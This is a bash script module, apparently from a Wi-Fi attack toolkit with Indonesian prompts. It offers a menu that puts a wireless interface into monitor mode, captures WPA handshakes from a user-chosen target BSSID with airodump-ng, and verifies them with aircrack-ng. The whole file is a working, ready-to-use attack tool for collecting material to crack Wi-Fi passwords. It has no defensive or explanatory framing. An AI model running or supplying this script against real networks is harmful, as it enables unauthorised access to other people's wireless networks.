#!/usr/bin/env bash
# ============================================
#   MODULE: RECLAIM CATCH IN MID-AIR (Smart Fallback)
# ============================================

if [ -f "./bxp_libcore.sh" ]; then source ./bxp_libcore.sh; fi

show_ascii() {
    clear
    echo -e "\033[38;2;148;0;211m" # UNGU
    cat <<'ASCII'
██████╗ ███████╗ ██████╗██╗      █████╗ ██╗███╗   ███╗     ██████╗ █████╗ ████████╗ ██████╗██╗  ██╗
██╔══██╗██╔════╝██╔════╝██║     ██╔══██╗██║████╗ ████║    ██╔════╝██╔══██╗╚══██╔══╝██╔════╝██║  ██║
██████╔╝█████╗  ██║     ██║     ███████║██║██╔████╔██║    ██║     ███████║   ██║   ██║     ███████║
██╔══██╗██╔══╝  ██║     ██║     ██╔══██║██║██║╚██╔╝██║    ██║     ██╔══██║   ██║   ██║     ██╔══██║
██║  ██║███████╗╚██████╗███████╗██║  ██║██║██║ ╚═╝ ██║    ╚██████╗██║  ██║   ██║   ╚██████╗██║  ██║
╚═╝  ╚═╝╚══════╝ ╚═════╝╚══════╝╚═╝  ╚═╝╚═╝╚═╝     ╚═╝     ╚═════╝╚═╝  ╚═╝   ╚═╝    ╚═════╝╚═╝  ╚═╝
ASCII
    echo -e "\033[0m\n"
}

while true; do
    show_ascii
    
    if [ "$(id -u)" -eq 0 ]; then
        ROOT_MODE=1
        STATUS_MSG="\033[1;32m[+] ROOT MODE ACTIVE\033[0m"
    else
        ROOT_MODE=0
        STATUS_MSG="\033[1;33m[!] NON-ROOT MODE (LIMITED)\033[0m"
    fi

    echo -e "${C}======================================================${N}"
    echo -e "${W}    WPA/WPA3 HANDSHAKE CAPTURE ENGINE${N}"
    echo -e "    Status: $STATUS_MSG"
    echo -e "${C}======================================================${N}"
    echo ""
    
    if [ "$ROOT_MODE" -eq 1 ]; then
        echo -e "  \033[1;32m[1]\033[0m  \033[1;37mStart Handshake Capture\033[0m"
    else
        echo -e "  \033[1;30m[1] Start Handshake Capture (Requires Root)\033[0m"
    fi
    echo -e "  \033[1;32m[2]\033[0m  \033[1;37mVerify Captured Handshake\033[0m"
    echo ""
    echo -e "  \033[1;31m[0]\033[0m  \033[1;37mBack to Main Menu\033[0m"
    echo ""
    echo -e "${C}------------------------------------------------------${N}"
    echo -ne "  ${Y}Select option > ${N}"
    read -r catch_choice

    case "$catch_choice" in
        1)
            if [ "$ROOT_MODE" -eq 0 ]; then echo -e "\n\033[0;31m[!] FITUR INI MEMBUTUHKAN ROOT.\033[0m"; read -p "Press Enter..."; continue; fi
            echo -e "\n${Y}[*] Menyiapkan Handshake Capture...${N}"
            IFACE=$(iw dev 2>/dev/null | awk '/Interface/{print $2}' | head -n 1)
            read -p "Masukkan BSSID Target: " BSSID
            read -p "Masukkan Channel Target: " CHAN
            read -p "Durasi Capture (detik, default 60): " DURATION
            DURATION=${DURATION:-60}
            svc wifi disable 2>/dev/null; ip link set "$IFACE" down 2>/dev/null
            iw dev "$IFACE" set type monitor 2>/dev/null; ip link set "$IFACE" up 2>/dev/null
            iw dev "$IFACE" set channel "$CHAN" 2>/dev/null
            echo -e "\n${R}[*] Menangkap Handshake dari $BSSID (${DURATION}s)...${N}"
            OUT_PREFIX="/tmp/nw_handshake_$(date +%s)"
            timeout "$DURATION" airodump-ng -c "$CHAN" --bssid "$BSSID" -w "$OUT_PREFIX" --output-format pcap "$IFACE" > /dev/null 2>&1
            CAP_FILE="${OUT_PREFIX}-01.cap"
            if [ -f "$CAP_FILE" ]; then
                echo -e "\n${G}[+] Capture selesai. File: $CAP_FILE${N}"
                if aircrack-ng "$CAP_FILE" 2>/dev/null | grep -q "1 handshake"; then
                    echo -e "${G}[+] SUKSES! Handshake DITEMUKAN!${N}"
                else
                    echo -e "${Y}[!] File tersimpan, tapi handshake belum ketangkep.${N}"
                fi
            fi
            ip link set "$IFACE" down 2>/dev/null; iw dev "$IFACE" set type managed 2>/dev/null; ip link set "$IFACE" up 2>/dev/null; svc wifi enable 2>/dev/null
            read -p "Press Enter to continue..."
            ;;
        2)
            echo -e "\n${Y}[*] Verifikasi Handshake (Bisa Non-Root)...${N}"
            read -p "Masukkan path file .cap: " CAP_PATH
            if [ ! -f "$CAP_PATH" ]; then echo -e "\n\033[0;31m[!] File tidak ditemukan!\033[0m"; read -p "Press Enter..."; continue; fi
            echo -e "\n${G}[*] Menganalisis file...${N}"
            aircrack-ng "$CAP_PATH"
            read -p "Press Enter to continue..."
            ;;
        0) exit 0 ;;
        *) echo -e "  ${R}[!] Invalid choice.${N}"; sleep 1 ;;
    esac
done
